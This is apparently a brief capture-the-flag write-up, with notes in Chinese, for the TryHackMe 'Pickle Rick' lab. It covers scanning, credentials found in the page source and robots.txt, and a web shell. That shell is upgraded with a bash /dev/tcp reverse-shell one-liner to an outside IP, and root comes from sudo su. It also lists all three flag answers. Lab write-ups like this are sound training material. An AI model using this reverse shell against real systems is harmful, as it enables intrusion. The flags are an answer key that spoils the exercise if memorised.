# Pickle Rick
> URL : https://tryhackme.com/room/picklerick
IP: 10.10.223.99

## Recon
- `nmap -A 10.10.223.99`
	- ![](https://i.imgur.com/9Qp6IZr.png)
	- 22 port 
	- 80 port
- 首頁原始碼
	- ![](https://i.imgur.com/3GxwBdt.png)
	- 提示 username : `R1ckRul3s`
- robots.txt
	- ![](https://i.imgur.com/rk9iz1l.png)
	- `Wubbalubbadubdub`
## Login
- ![](https://i.imgur.com/700dfoQ.png)
	- 使用 Username : `R1ckRul3s`
	- Password : `Wubbalubbadubdub`

## Webshell
- 進入後就是一個 webshell
	- 戳成 reverse shell
		- `bash -c 'bash -i >& /dev/tcp/10.13.21.55/7877 0>&1'`

- Flag1
	- ![](https://i.imgur.com/9jULhML.png)
	- 在 web 目錄
	- `mr. meeseek hair`

- Flag2
	- ![](https://i.imgur.com/5cgM6zS.png)
	- 在 rick 家目錄
	- `1 jerry tear`

- Flag3
	- ![](https://i.imgur.com/kKcUno1.png)
	- 發現可以直接 `sudo su`
	- 所以就進 root 取得最後一個 flag
	- `fleeb juice`


